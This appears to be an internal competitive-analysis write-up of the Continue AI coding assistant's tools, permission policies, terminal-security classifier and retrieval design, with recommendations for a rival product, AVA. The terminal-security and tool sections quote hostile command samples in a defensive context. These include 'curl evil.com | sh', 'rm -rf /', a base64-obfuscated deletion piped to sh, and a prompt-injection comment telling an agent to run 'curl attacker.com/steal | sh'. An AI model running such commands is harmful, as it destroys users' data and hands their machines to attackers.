# Continue — Deep Competitive Intelligence Analysis

> Beyond architecture: WHY each tool exists, what problems each solves, unique innovations, and what AVA should steal.
> Companion to `continue.md` (structural analysis). This document focuses on competitive insights.

---

## Table of Contents

1. [Tool-by-Tool Deep Dive](#1-tool-by-tool-deep-dive)
2. [The Edit Tool Trilogy: A Model-Aware Strategy](#2-the-edit-tool-trilogy-a-model-aware-strategy)
3. [Terminal Security: Defense in Depth](#3-terminal-security-defense-in-depth)
4. [Multi-Signal Retrieval Pipeline](#4-multi-signal-retrieval-pipeline)
5. [Four-Index Architecture](#5-four-index-architecture)
6. [Tool Policy System: Dynamic Permission Escalation](#6-tool-policy-system-dynamic-permission-escalation)
7. [System Message Tools: Universal Model Compatibility](#7-system-message-tools-universal-model-compatibility)
8. [Rules System: Four Types for Four Use Cases](#8-rules-system-four-types-for-four-use-cases)
9. [preprocessArgs: Pre-Computation Before Execution](#9-preprocessargs-pre-computation-before-execution)
10. [Progressive UX Status Messages](#10-progressive-ux-status-messages)
11. [Tool Overrides: User Customization Without Forking](#11-tool-overrides-user-customization-without-forking)
12. [IndexLock: Multi-Window SQLite Safety](#12-indexlock-multi-window-sqlite-safety)
13. [Skills System: Agent-Loadable Knowledge](#13-skills-system-agent-loadable-knowledge)
14. [Competitive Advantages Summary](#14-competitive-advantages-summary)
15. [What AVA Should Adopt](#15-what-ava-should-adopt)

---

## 1. Tool-by-Tool Deep Dive

### Why Each Tool Exists

Continue has 20+ built-in tools. This section explains the *problem each solves* and the *value it provides over alternatives*.

---

### `read_file`

**Problem it solves:** The agent needs to see file contents to understand code, debug issues, and plan edits.

**Why it exists as a separate tool (not just IDE context):** LLMs need *on-demand* file reading during multi-step reasoning. Pre-loading all files into context would waste tokens. The agent reads files *when it needs them*, keeping context lean.

**What would break without it:** The agent would have to ask the user to paste file contents, or rely solely on pre-loaded context (which can't cover files discovered during reasoning).

**Clever detail:** The tool's `evaluateToolCallPolicy` checks if the requested file is within the workspace. Files outside workspace boundaries automatically escalate to `allowedWithPermission`, preventing the agent from reading sensitive system files like `/etc/passwd` or `~/.ssh/id_rsa` without user approval.

---

### `read_file_range`

**Problem it solves:** Large files (1000+ lines) waste tokens when only a small section is needed.

**Why it exists separately from `read_file`:** Token efficiency. Reading line 500-520 of a 2000-line file saves ~1980 lines of context tokens. This is especially critical in long agent sessions where context windows fill up.

**What would break without it:** Agents would read entire files, quickly exhausting context windows on large codebases. The alternative (user manually specifying ranges) defeats the purpose of autonomy.

**Status:** Experimental — gated behind `enableExperimentalTools` flag.

---

### `read_currently_open_file`

**Problem it solves:** The user is looking at a file *right now*. That file is likely the most relevant context for their question.

**Why it exists separately from `read_file`:** The agent doesn't need to guess which file the user cares about. Instead of requiring the user to say "look at src/foo.ts", the agent can infer intent from what's already open. This is *implicit context* — the IDE knows what the user is focused on.

**Default policy is `allowedWithPermission`:** This is interesting — even though reading a file seems safe, the fact that it accesses the *currently focused* file means it reveals user behavior. Continue treats this as slightly more sensitive than arbitrary file reads.

**What would break without it:** The agent would need to ask "which file are you looking at?" or the user would need to explicitly mention the file path every time. This tool eliminates a round trip.

---

### `create_new_file`

**Problem it solves:** The agent needs to create files that don't exist yet (new components, tests, configs).

**Why it's separate from edit tools:** Semantic clarity. Creating a new file is a different intent than editing an existing one. The tool validates that the file *doesn't already exist*, preventing accidental overwrites.

**What would break without it:** The agent would need to use a generic write tool and hope the user notices if it accidentally overwrites an existing file.

---

### `edit_existing_file` (for non-agent models)

**Problem it solves:** Weaker models (non-recommended-agent models) struggle to produce exact find-and-replace strings. They're better at showing a "lazy diff" — a description of changes with context lines.

**Why it exists:** This is a *model capability adaptation*. Continue recognizes that not all LLMs can reliably produce exact string matches for search-and-replace. The "lazy diff" format is more forgiving — it uses surrounding context to locate the edit region and applies changes even if the model's output isn't character-perfect.

**The key insight:** Rather than forcing all models to use the same editing interface (and having weaker models fail), Continue provides a fallback that matches the model's actual capability level.

**What would break without it:** Users with smaller/local models would experience high edit failure rates because the model can't produce exact text matches.

---

### `single_find_and_replace` (for non-agent models)

**Problem it solves:** Simple, surgical edits — change one specific string to another.

**Why it coexists with `edit_existing_file`:** Some edits are genuinely simple (rename a variable, fix a typo). The find-and-replace interface is easier for the model to reason about for these cases. Having both tools lets the model choose the appropriate granularity.

**What would break without it:** The agent would be forced to use the heavier diff-based edit for trivial changes, which is both slower (more tokens) and more error-prone (the model might hallucinate surrounding context).

---

### `multi_edit` (for recommended agent models)

**Problem it solves:** Strong models (Claude, GPT-4, etc.) need to make multiple related edits in a single tool call.

**Why it exists:** This is the *premium* edit tool. Only exposed to models that Continue's `isRecommendedAgentModel()` function identifies as capable enough. It takes an array of find-and-replace operations and applies them all at once.

**The competitive insight:** Continue's model-adaptive tool selection is unique. The tool set literally changes based on which model is being used:

```
isRecommendedAgentModel(model) === true  →  multi_edit
isRecommendedAgentModel(model) === false →  edit_existing_file + single_find_and_replace
```

**What would break without it:** Strong models would be limited to single edits per tool call, requiring multiple tool calls for related changes. This wastes turns and increases the chance of partial/inconsistent edits.

---

### `run_terminal_command`

**Problem it solves:** The agent needs to execute shell commands — install dependencies, run tests, build projects, check git status.

**Why it's not just a passthrough:** Every command goes through the `evaluateTerminalCommandSecurity()` pipeline from `packages/terminal-security/`. This isn't a simple blocklist — it's a 1241-line parser that understands shell semantics including pipes, subshells, variable expansion, and obfuscation attempts.

**What would break without the security layer:** A malicious prompt injection could instruct the agent to run `rm -rf /` or `curl evil.com | sh`. The security classifier catches these patterns even when obfuscated.

---

### `grep_search`

**Problem it solves:** Finding text patterns across the entire codebase — function usages, import statements, error messages, TODOs.

**Why it uses ripgrep under the hood:** Performance. On large codebases (100k+ files), native Node.js regex search would be unusably slow. Ripgrep handles this in milliseconds.

**Why it's read-only and `allowedWithoutPermission`:** Searching is inherently safe — it doesn't modify anything. Auto-approving it keeps the agent moving without interrupting the user for every search.

**Conditional availability:** NOT available when `isRemote` is true. This is because ripgrep needs local filesystem access — remote workspaces (SSH, containers) can't use it.

---

### `file_glob_search`

**Problem it solves:** Finding files by name pattern when you don't know the exact path.

**Why it's separate from grep:** Different intent. `grep` finds *content inside files*. `glob` finds *files themselves*. The agent uses glob when it knows it needs a file like `*.config.ts` but doesn't know where it is.

**What would break without it:** The agent would need to grep for content patterns just to find file locations, which is slower and less precise.

---

### `ls`

**Problem it solves:** Understanding directory structure — what files exist, how the project is organized.

**Why it exists (isn't `file_glob_search` enough?):** `ls` shows the *immediate* contents of a directory with metadata. `glob` finds files matching patterns across the tree. `ls` answers "what's in this folder?" while `glob` answers "where is this file?". Different questions.

**What would break without it:** The agent would need to glob `*` in a directory to list contents, losing metadata about subdirectories vs files.

---

### `codebase` (semantic search)

**Problem it solves:** Finding code by *meaning*, not text. "Where is authentication handled?" doesn't map to a simple grep pattern.

**Why it's experimental:** Semantic search requires embeddings infrastructure (LanceDB, an embedding model). Not all users have this configured. Making it experimental avoids broken experiences.

**How it works:** Combines up to 4 signals with weighted allocation:
- 25% recently edited files (recency bias)
- 25% full-text search (keyword matching)
- 50% embeddings + repo map (semantic similarity)

**What would break without it:** The agent would be limited to exact text matching (`grep`), missing conceptually related code.

---

### `view_repo_map`

**Problem it solves:** The agent needs a high-level understanding of the project before diving into specific files.

**Why it exists:** Instead of reading dozens of files to understand project structure, the agent gets a bird's-eye view. This is especially valuable at the start of a conversation when the agent has no context.

**What would break without it:** The agent would spend its first several turns just doing `ls` on directories to understand the project layout.

---

### `view_subdirectory`

**Problem it solves:** When `view_repo_map` is too high-level and `ls` is too low-level. The agent needs to understand one specific area of the codebase in moderate detail.

**Why it exists separately from both `ls` and `view_repo_map`:** It provides a *focused* tree view of a subdirectory, which is more useful than a flat file listing (`ls`) but more targeted than the full repo map.

---

### `view_diff`

**Problem it solves:** The agent needs to see what's changed in the current working tree (unstaged + staged changes).

**Why it exists:** When debugging ("what did I just break?") or reviewing ("what have we done so far?"), the diff is the most information-dense view available.

**What would break without it:** The agent would need to run `git diff` via the terminal tool, which requires terminal security checks and is slower.

---

### `search_web`

**Problem it solves:** The agent needs information that isn't in the codebase — API documentation, error message explanations, library usage examples.

**Why it requires sign-in:** Web search has real costs (API calls to search providers). Continue gates this behind authentication to prevent abuse and track usage.

**What would break without it:** The agent would need to ask the user to look things up, breaking the autonomous flow.

---

### `fetch_url_content`

**Problem it solves:** The agent has a specific URL (from search results, documentation, stack traces) and needs its content.

**Why it requires permission (`allowedWithPermission`):** Fetching arbitrary URLs is a potential security/privacy risk — the agent could be tricked into exfiltrating data by fetching a malicious URL that encodes workspace content in query parameters.

**What would break without it:** The agent could find URLs via search but couldn't read them, making search results less actionable.

---

### `create_rule_block`

**Problem it solves:** The agent discovers a coding pattern or convention and wants to *remember it* for future conversations.

**Why it's disabled by default:** Creating persistent rules that affect all future conversations is a high-impact action. The user should opt in explicitly.

**The innovation:** This is *agent-initiated learning*. The agent doesn't just follow rules — it can create new ones. This is a feedback loop: the agent discovers conventions → creates rules → future conversations follow those conventions automatically.

**What would break without it:** Every new conversation would start from scratch with no project-specific conventions, leading to repeated corrections.

---

### `request_rule`

**Problem it solves:** The agent knows a relevant rule *might exist* but hasn't loaded it yet.

**Why it's separate from `create_rule_block`:** Different intent — requesting existing knowledge vs. creating new knowledge. Rules marked as "Agent Requested" have descriptions that help the agent decide when to load them.

**What would break without it:** All rules would need to be "Always" or "Auto Attached", bloating every system prompt. Agent-requested rules keep the system prompt lean by loading rules on demand.

---

### `read_skill`

**Problem it solves:** The agent encounters a task that has a documented procedure (a "skill") and needs to load those instructions.

**Why skills are separate from rules:** Rules are *constraints* ("always use semicolons"). Skills are *procedures* ("how to deploy to staging"). Different abstraction.

**Compatibility note:** Reads from both `.continue/skills/` and `.claude/skills/`, showing awareness of the broader ecosystem (Claude Code uses the same skills convention).

---

## 2. The Edit Tool Trilogy: A Model-Aware Strategy

This is one of Continue's most innovative patterns. Instead of a one-size-fits-all edit tool, they provide **three tiers** matched to model capability:

### Tier 1: `multi_edit` (Strong Models)

**Target:** Claude 3.5+, GPT-4+, Gemini 1.5 Pro — models identified by `isRecommendedAgentModel()`.

**Interface:** Array of `{filepath, old_text, new_text}` operations applied atomically.

**Why:** Strong models can reliably produce exact text matches and reason about multiple coordinated changes.

### Tier 2: `edit_existing_file` + `single_find_and_replace` (Weaker Models)

**Target:** Smaller models, local models, older API models.

**`edit_existing_file` interface:** A "lazy diff" format where the model shows changes with surrounding context lines. The implementation uses fuzzy matching to locate the edit region.

**`single_find_and_replace` interface:** Simple `{filepath, find, replace}` — one change at a time.

**Why:** Weaker models hallucinate whitespace, miss exact character sequences, and struggle with multi-file coordination. These tools are more forgiving.

### The Selection Logic

```typescript
// core/tools/index.ts
if (isRecommendedAgentModel(modelName)) {
  tools.push(multiEditTool);
} else {
  tools.push(editFileTool, singleFindAndReplaceTool);
}
```

### Competitive Insight for AVA

Most competitors (Cline, Aider, OpenCode) use a single edit mechanism for all models. This leads to:
- High failure rates when users use smaller models
- Users blaming the tool when the model is actually the bottleneck

Continue's approach is *model-empathetic* — it adapts the tool interface to what the model can actually handle. **AVA should adopt this pattern.**

---

## 3. Terminal Security: Defense in Depth

**Package:** `packages/terminal-security/src/evaluateTerminalCommandSecurity.ts` (1241 lines)

This is the most sophisticated terminal security system in any open-source AI coding tool.

### What It Does

Every shell command passes through a classifier that determines if the command should be:
- **Auto-approved** (safe commands like `ls`, `cat`, `git status`)
- **Require permission** (potentially dangerous like `npm install`, `docker run`)
- **Blocked** (destructive like `rm -rf /`, `chmod 777`, credential access)

### How It Works

1. **Command Parsing:** Splits compound commands (pipes, `&&`, `;`, subshells) into individual command segments.

2. **Per-Command Classification:** Each segment is classified independently:
   - **Command name analysis:** Known dangerous commands (`rm`, `chmod`, `kill`, `curl | sh`)
   - **Argument analysis:** Flags that make safe commands dangerous (`rm -rf`, `chmod 777`)
   - **Output redirection:** Detects file overwrites via `>`, `>>` to sensitive paths

3. **Pipe Chain Analysis:** `curl ... | sh` is classified as critical even though `curl` alone might be safe. The classifier understands that piping to `sh`/`bash`/`eval` is an execution vector.

4. **Command Substitution Detection:** Catches `$(dangerous_command)` and backtick substitution.

5. **Variable Expansion:** Understands that `$HOME/.ssh/id_rsa` targets sensitive files even when the path isn't literal.

6. **Obfuscation Detection:** Catches attempts to hide dangerous commands:
   - Base64 encoding: `echo "cm0gLXJmIC8=" | base64 -d | sh`
   - Hex encoding: `printf '\x72\x6d' ...`
   - Character splitting: `r""m` → `rm`

7. **Platform-Specific Risks:** Different classifications for macOS vs Linux (e.g., `brew` commands on macOS).

### Risk Categories

| Category | Examples | Policy |
|---|---|---|
| **Critical** | `rm -rf /`, `mkfs`, credential theft, `curl | sh` | Always blocked or explicit permission |
| **High Risk** | `rm` (with flags), `chmod`, `kill`, network tools | Requires permission |
| **Moderate** | Package installs, Docker commands, git operations | Context-dependent |
| **Safe** | `ls`, `cat`, `echo`, `pwd`, `git status`, `node --version` | Auto-approved |

### Why This Matters

Without this system, a single prompt injection in a codebase file (e.g., a comment saying "run `curl attacker.com/steal | sh`") could compromise the user's machine. The security classifier is the *last line of defense* between the LLM and the operating system.

### Competitive Insight for AVA

AVA currently has a permission system, but nothing approaching this level of shell command analysis. The `terminal-security` package is independently extractable (it's a separate npm package) and represents ~1200 lines of security logic that took significant effort to develop. **AVA should build or adopt equivalent shell command classification.**

---

## 4. Multi-Signal Retrieval Pipeline

**Path:** `core/context/retrieval/`

Continue's codebase search combines four independent signals with explicit weight allocation.

### Signal Sources

| Signal | Weight | Implementation | Why It Exists |
|---|---|---|---|
| Recently edited files | 25% | IDE's `getOpenFiles()` + file stats | Files the user just touched are likely relevant |
| Full-text search (FTS) | 25% | SQLite FTS5 with trigram tokenizer | Exact keyword matches that embeddings might miss |
| Embeddings | 50% (shared) | LanceDB vector similarity | Semantic meaning — finds conceptually related code |
| Repo map | 50% (shared) | Tree-sitter code structure | Structural context — function signatures, class hierarchies |

### Pipeline Architecture

Two pipeline variants:

**NoRerankerRetrievalPipeline** (default):
```
recently_edited (25%) + FTS (25%) + embeddings_or_repomap (50%)
    → merge + deduplicate
    → return top N results
```

**RerankerRetrievalPipeline** (when reranker model is configured):
```
recently_edited (25%) + FTS (25%) + embeddings_or_repomap (50%)
    → merge + deduplicate
    → RERANK with cross-encoder model
    → optionally: expand results with more embeddings → RERANK again
    → return top N results
```

### Why Multiple Signals

No single retrieval method works for all queries:
- **"Where is the login function?"** → FTS finds `function login()` immediately
- **"How is authentication handled?"** → Embeddings find semantically related code even if it doesn't contain the word "authentication"
- **"What did I just change?"** → Recently edited files are the answer
- **"What's the API structure?"** → Repo map shows the function/class hierarchy

By combining signals with weighted allocation, Continue gets good results regardless of query type.

### Competitive Insight for AVA

AVA's codebase search currently uses a simpler approach. Continue's weighted multi-signal pipeline is a proven pattern that significantly improves retrieval quality. The specific weights (25/25/50) were likely tuned empirically and represent a good starting point for AVA's own retrieval system.

---

## 5. Four-Index Architecture

**Path:** `core/indexing/`

Continue maintains four distinct index types, each optimized for a different access pattern.

### Index Types

| Index | Storage | Purpose | When Built |
|---|---|---|---|
| `chunk` | SQLite | Chunked file storage for context providers | On-demand |
| `codeSnippets` | SQLite | Tree-sitter extracted functions/classes/methods | On-demand |
| `fullTextSearch` | SQLite FTS5 | Keyword search with trigram tokenizer | On-demand |
| `embeddings` | LanceDB (vector) | Semantic similarity search | On-demand |

### Why Four Indexes

Each serves a different query type:
- **Chunks:** "Show me the contents of this function" — needs contiguous text blocks
- **Code Snippets:** "What functions exist in this module?" — needs structural boundaries
- **FTS:** "Find all files containing `authenticate`" — needs fast text lookup
- **Embeddings:** "Find code related to user authorization" — needs semantic matching

### On-Demand Construction

Indexes aren't built eagerly. Each context provider declares which indexes it depends on:

```typescript
interface ContextProviderDescription {
  dependsOnIndexing?: ("chunk" | "embeddings" | "fullTextSearch" | "codeSnippets")[];
}
```

When a context provider is first used, the indexer checks if its required indexes are up-to-date and builds/updates them if needed. This means:
- Users who never use semantic search never pay the embedding cost
- Users who only use grep never wait for index builds
- Each index updates incrementally based on file change detection

### The CodebaseIndexer Orchestrator

`CodebaseIndexer.ts` manages all four indexes:
- **Batching:** Files are processed in batches to avoid memory pressure
- **Pausing:** Indexing can be paused/resumed (important for IDE responsiveness)
- **Locking:** IndexLock prevents SQLite corruption from concurrent writes
- **Incremental updates:** Only processes changed files since last index

### Competitive Insight for AVA

AVA doesn't currently have a multi-index architecture. The on-demand construction pattern is particularly clever — it avoids the "first-run penalty" that makes other tools feel slow on large codebases.

---

## 6. Tool Policy System: Dynamic Permission Escalation

**Files:** Tool definitions + `core/tools/policies/fileAccess.ts`

Continue's permission model goes beyond simple allow/deny. Policies are *dynamic* — they can change based on the specific arguments of each tool call.

### Three Policy Levels

```typescript
type ToolPolicy = "allowedWithoutPermission" | "allowedWithPermission" | "disabled";
```

### Static vs Dynamic Policies

**Static (defaultToolPolicy):** Set on the tool definition. Example: `read_file` defaults to `allowedWithoutPermission`.

**Dynamic (evaluateToolCallPolicy):** A function on the tool that inspects the arguments and can *escalate* the policy. Example:

```typescript
// read_file's evaluateToolCallPolicy
evaluateToolCallPolicy: (basePolicy, parsedArgs) => {
  if (!isWithinWorkspace(parsedArgs.filepath)) {
    return "allowedWithPermission";  // Escalate!
  }
  return basePolicy;  // Keep default
}
```

### Real-World Scenarios

| Tool | Default | Escalation Condition | Escalated To |
|---|---|---|---|
| `read_file` | `allowedWithoutPermission` | File outside workspace | `allowedWithPermission` |
| `create_new_file` | `allowedWithPermission` | File outside workspace | `allowedWithPermission` |
| `run_terminal_command` | `allowedWithPermission` | Command classified as critical | Higher scrutiny UX |
| `fetch_url_content` | `allowedWithPermission` | — | (always requires permission) |

### Why Dynamic Escalation Matters

A static policy system has two failure modes:
1. **Too permissive:** Auto-approving all file reads lets the agent read `/etc/shadow`
2. **Too restrictive:** Requiring permission for all file reads creates approval fatigue

Dynamic escalation solves both: workspace files are auto-approved (fast), out-of-workspace files require approval (safe). The user gets the best of both worlds.

### Competitive Insight for AVA

AVA's permission system currently uses static policies per tool. Adding dynamic escalation based on arguments would significantly improve both security and user experience. The file access boundary check (`isWithinWorkspace`) is the highest-value escalation to implement.

---

## 7. System Message Tools: Universal Model Compatibility

**Path:** `core/tools/systemMessageTools/`

This is one of Continue's cleverest innovations. It enables tool calling on *any* model, even those without native function calling support.

### The Problem

Many models (especially local/open-source) don't support the `tools` parameter in their API. Without native tool calling, the agent can't use tools.

### The Solution

Continue injects tool descriptions directly into the system message and parses tool calls from the model's text output:

```
System Message:
You have the following tools available:

read_file: Read the contents of a file
Parameters: filepath (string) - Path to file
Example: <tool_call>read_file(filepath="/src/main.ts")</tool_call>

...

When you want to use a tool, output it in the format shown above.
```

The model outputs text like:
```
I need to read the main file first.
<tool_call>read_file(filepath="/src/main.ts")</tool_call>
```

Continue's `interceptSystemToolCalls` parser detects the `<tool_call>` pattern in the streaming output and converts it back into structured tool call objects.

### Implementation Components

| File | Purpose |
|---|---|
| `buildToolsSystemMessage.ts` | Generates the system message section describing all tools |
| `convertSystemTools.ts` | Converts between native tool format and system message format |
| `detectToolCallStart.ts` | Detects the beginning of a tool call pattern in streaming text |
| `interceptSystemToolCalls.ts` | Full parser that extracts tool calls from text and reconverts them |
| `toolCodeblocks/` | Alternative format using code blocks instead of XML tags |

### Why This Matters

This single feature expands Continue's model compatibility from ~20 models (with native tool calling) to 77+ providers. Users running Ollama with local models can still use the full tool suite.

### Competitive Insight for AVA

AVA currently requires models to support native tool calling. Implementing system message tools would instantly expand model compatibility. The implementation is non-trivial (streaming parser, edge cases with partial outputs) but the value is enormous for users with local or non-standard models.

---

## 8. Rules System: Four Types for Four Use Cases

**Path:** `core/llm/rules/getSystemMessageWithRules.ts`

Continue's rules system is more nuanced than simple "custom instructions." It provides four distinct rule types, each matching a different workflow.

### Rule Types

| Type | When Applied | Config Pattern | Use Case |
|---|---|---|---|
| **Always** | Every conversation | `alwaysApply: true`, no globs | Universal conventions ("use TypeScript strict mode") |
| **Auto Attached** | When matching files are in context | `globs` and/or `regex` patterns | File-type conventions ("React components use functional style") |
| **Agent Requested** | Agent decides to load it | `alwaysApply: false`, has `description` | Specialized knowledge ("deployment procedure") |
| **Manual** | Only via `@rules` mention | `alwaysApply: false`, no description | Rarely needed procedures |

### Why Four Types

The key insight is **context window economics**:

- **Always rules** must be brief because they're in every prompt
- **Auto Attached rules** only appear when relevant files are present — no wasted tokens
- **Agent Requested rules** stay out of the prompt until the agent decides it needs them
- **Manual rules** never appear unless the user explicitly requests them

This creates a natural hierarchy from "always loaded" to "loaded only when explicitly summoned."

### Matching Mechanisms

**Glob patterns:** `globs: ["*.tsx", "src/components/**"]` — triggers when matching files are in context.

**Regex patterns:** `regex: "import.*React"` — triggers when file *content* matches the pattern. This is more powerful than globs because it can match on imports, annotations, or any text pattern.

**Directory co-location:** Rules in `.continue/rules/` automatically apply to the workspace they're in.

### Agent-Created Rules

The `create_rule_block` tool allows the agent to persist new rules:

```
Agent discovers: "This project uses semicolons and single quotes"
→ Agent calls create_rule_block with content and metadata
→ Rule is saved to .continue/rules/
→ All future conversations follow the convention
```

This is a **learning feedback loop** — the agent gets smarter about the project over time.

### Competitive Insight for AVA

AVA has a project instructions system but lacks the four-tier differentiation and auto-attachment via globs/regex. The agent-requested rules pattern is particularly valuable — it keeps the system prompt lean while making specialized knowledge available on demand.

---

## 9. preprocessArgs: Pre-Computation Before Execution

**Pattern found on:** Edit tools (`multi_edit`, `edit_existing_file`, `single_find_and_replace`)

### The Pattern

Tools can define a `preprocessArgs` function that runs *before* the tool executes:

```typescript
interface Tool {
  preprocessArgs?: (
    args: Record<string, unknown>,
    extras: ToolExtras
  ) => Promise<Record<string, unknown>>;
}
```

### What It Does for Edit Tools

For edit tools, `preprocessArgs`:
1. Reads the current file contents
2. Applies the edit operations (find/replace)
3. Computes the *resulting* file contents
4. Returns both the original and new contents as processed args

### Why This Exists

The IDE (VS Code, JetBrains) can then show a **diff preview** of the changes *before* the tool actually modifies the file. This is crucial for the "allowedWithPermission" UX — when the user sees the permission prompt, they also see exactly what will change.

Without `preprocessArgs`, the permission dialog would just say "The agent wants to edit file X" — the user would have to approve blindly.

### The Protocol Flow

```
1. Agent produces tool call: multi_edit({filepath: "foo.ts", edits: [...]})
2. GUI sends tools/preprocessArgs to Core
3. Core runs preprocessArgs → computes new file contents
4. Core returns preprocessed args to GUI
5. GUI shows diff preview to user
6. User approves/denies
7. If approved, GUI sends tools/call with preprocessed args
8. Core applies the pre-computed edit
```

### Competitive Insight for AVA

This is a UX innovation worth stealing. Showing the user a diff *before* applying changes dramatically increases trust and reduces undo operations. AVA should implement pre-computation for edit tools and expose it in the approval flow.

---

## 10. Progressive UX Status Messages

**Pattern found on:** All tool definitions

Every tool defines three Handlebars template strings:

```typescript
interface Tool {
  wouldLikeTo?: string;   // "read {{{ filepath }}}"
  isCurrently?: string;   // "reading {{{ filepath }}}"
  hasAlready?: string;    // "read {{{ filepath }}}"
}
```

### Why Three Tenses

These map to the tool's lifecycle in the UI:

| State | Template | Example Output |
|---|---|---|
| **Pending approval** | `wouldLikeTo` | "AVA would like to **read** `src/main.ts`" |
| **Executing** | `isCurrently` | "AVA is currently **reading** `src/main.ts`" |
| **Completed** | `hasAlready` | "AVA has already **read** `src/main.ts`" |

### Why Handlebars Templates

The templates use `{{{ arg_name }}}` (triple braces for unescaped) to inject tool arguments:

```typescript
// grep_search tool
wouldLikeTo: "search for `{{{ pattern }}}` in {{{ path }}}",
isCurrently: "searching for `{{{ pattern }}}` in {{{ path }}}",
hasAlready: "searched for `{{{ pattern }}}` in {{{ path }}}",
```

This produces human-readable, contextual status messages like:
- "AVA would like to search for `TODO` in `src/`"
- "AVA is currently searching for `TODO` in `src/`"
- "AVA has already searched for `TODO` in `src/`"

### Competitive Insight for AVA

AVA currently uses generic tool names in status messages. Adding templated progressive tense messages would significantly improve the UX — users would always know what the agent is doing, what it wants to do, and what it has done.

---

## 11. Tool Overrides: User Customization Without Forking

**File:** `core/tools/applyToolOverrides.ts`

Users can customize any tool's behavior through configuration:

```yaml
# .continue/config.yaml
toolOverrides:
  - name: "read_file"
    description: "Custom description for this project"
  - name: "run_terminal_command"
    displayTitle: "Execute Command"
    disabled: true  # Disable entirely
```

### What Can Be Overridden

| Property | Effect |
|---|---|
| `description` | Changes the tool's description sent to the LLM (affects how the model uses it) |
| `displayTitle` | Changes the UI label |
| `wouldLikeTo`, `isCurrently`, `hasAlready` | Custom status messages |
| `disabled: true` | Completely removes the tool |

### Why This Matters

Different projects have different needs:
- A security-sensitive project might disable `run_terminal_command` entirely
- A documentation-heavy project might customize the `search_web` description to prioritize docs
- An enterprise deployment might override tool descriptions to match internal terminology

### Competitive Insight for AVA

AVA's tool system doesn't currently support user overrides. This is a low-effort, high-value feature: users can adapt the agent's behavior without any code changes.

---

## 12. IndexLock: Multi-Window SQLite Safety

**Pattern found in:** `core/indexing/CodebaseIndexer.ts`

### The Problem

Users often have multiple IDE windows open on the same project. Each window runs its own Continue instance, and each instance tries to update the same SQLite database. SQLite doesn't handle concurrent writers well — it throws "database is locked" errors.

### The Solution: IndexLock

Continue implements a timestamp-based advisory lock:

```
Before indexing:
  1. Write a lock file with timestamp
  2. Check if another instance wrote a more recent lock
  3. If so, skip indexing (the other instance will handle it)
  4. If not, proceed with indexing

After indexing:
  5. Update the lock timestamp
```

### Why Not Use SQLite's Built-In Locking

SQLite's WAL mode handles concurrent *readers* well but concurrent *writers* still block. The IndexLock prevents the more expensive scenario: two instances both trying to build the same index simultaneously, doing double the work and risking corruption.

### Competitive Insight for AVA

As a desktop app, AVA might face similar multi-window scenarios. The IndexLock pattern is a simple but effective way to prevent duplicate work and database corruption.

---

## 13. Skills System: Agent-Loadable Knowledge

**Files:** `core/config/markdown/loadMarkdownSkills.ts`, `core/tools/definitions/readSkill.ts`

### What Skills Are

Skills are markdown files that contain detailed instructions for specific tasks:

```markdown
<!-- .continue/skills/deploy-staging.md -->
# Deploy to Staging

1. Ensure all tests pass: `npm test`
2. Build the project: `npm run build`
3. Deploy: `./scripts/deploy.sh staging`
4. Verify: check https://staging.example.com
```

### How They're Loaded

The `loadMarkdownSkills` function scans multiple directories for skill files:
- `.continue/skills/` (Continue's convention)
- `.claude/skills/` (Claude Code compatibility)

Skills are exposed to the agent via the `read_skill` tool. The agent can discover available skills and load them on demand.

### Why Skills Are Separate From Rules

| Aspect | Rules | Skills |
|---|---|---|
| **Content** | Constraints and conventions | Procedures and workflows |
| **Length** | Short (1-5 sentences) | Long (full documents) |
| **Loading** | Injected into system prompt | Loaded on demand via tool |
| **Purpose** | Shape behavior | Teach procedures |

### The Claude Code Compatibility

Reading from `.claude/skills/` is a strategic move — it means projects that already have Claude Code skills get those skills in Continue for free. This reduces switching friction.

### Competitive Insight for AVA

AVA already has a skills system. The key insight from Continue is the *on-demand loading via tool* pattern — skills don't bloat the system prompt; they're loaded only when the agent decides they're relevant.

---

## 14. Competitive Advantages Summary

### What Continue Does Better Than Most

| Innovation | Competitive Moat | Difficulty to Replicate |
|---|---|---|
| Model-adaptive edit tools | Massive UX improvement for local model users | Medium — needs model capability database |
| Terminal security classifier | 1241 lines of security logic | High — requires deep shell expertise |
| System message tools | Works with ANY model, not just tool-calling ones | Medium — streaming parser is tricky |
| Four-tier rules system | Token-efficient context customization | Low — mostly design decisions |
| Dynamic permission escalation | Better security without approval fatigue | Low — straightforward to implement |
| `preprocessArgs` diff preview | Users see changes before approval | Medium — requires protocol changes |
| Multi-signal retrieval (4 sources) | Better search quality than single-signal | High — needs multiple index backends |
| Progressive tense status messages | Clear, contextual UX | Low — just template strings |
| Cross-IDE architecture | VS Code + JetBrains from one codebase | Very High — fundamental architecture |
| 54+ LLM providers | Widest model compatibility | High — ongoing maintenance burden |

### What Continue Does Worse

| Weakness | Impact | Why |
|---|---|---|
| No core agent loop | GUI drives the loop — can't run headless/CLI efficiently | Historical architecture decision |
| No git snapshots | Can't revert to pre-edit state | Missing safety net |
| No session forking | Can't branch conversations | Missing feature |
| No commander/delegation | Single agent only | No multi-agent architecture |
| React (not SolidJS) | Larger bundle, slower reactivity | Framework choice |
| No PTY support | Terminal tool is fire-and-forget | Architectural limitation |

---

## 15. What AVA Should Adopt

### High Priority (High Impact, Low-Medium Effort)

1. **Dynamic permission escalation** — Add `evaluateToolCallPolicy` to tools, especially for file access boundary checks.

2. **Progressive tense status messages** — Add `wouldLikeTo`/`isCurrently`/`hasAlready` templates to every tool definition.

3. **Tool overrides via config** — Let users customize tool descriptions and disable tools per-project.

4. **Four-tier rules system** — Differentiate always/auto-attached/agent-requested/manual rules.

### Medium Priority (High Impact, High Effort)

5. **Model-adaptive tool selection** — Provide simpler edit tools for weaker models, advanced tools for strong models.

6. **Terminal command security classifier** — Build or port a shell command analyzer for the bash tool.

7. **`preprocessArgs` for edit tools** — Show diff previews before applying changes.

8. **System message tools fallback** — Enable tool calling on models without native support.

### Lower Priority (Good to Have)

9. **Multi-signal retrieval pipeline** — Combine FTS + embeddings + recency for codebase search.

10. **Four-index architecture** — Build purpose-specific indexes on-demand.

11. **IndexLock for multi-window safety** — Prevent concurrent write issues.

12. **Claude Code skill compatibility** — Read skills from `.claude/skills/` for ecosystem compatibility.

---

## Appendix: Key File References

| Concept | File Path |
|---|---|
| Tool definitions | `core/tools/definitions/*.ts` |
| Tool execution | `core/tools/callTool.ts` |
| Tool policies | `core/tools/policies/fileAccess.ts` |
| Tool overrides | `core/tools/applyToolOverrides.ts` |
| System message tools | `core/tools/systemMessageTools/` |
| Terminal security | `packages/terminal-security/src/evaluateTerminalCommandSecurity.ts` |
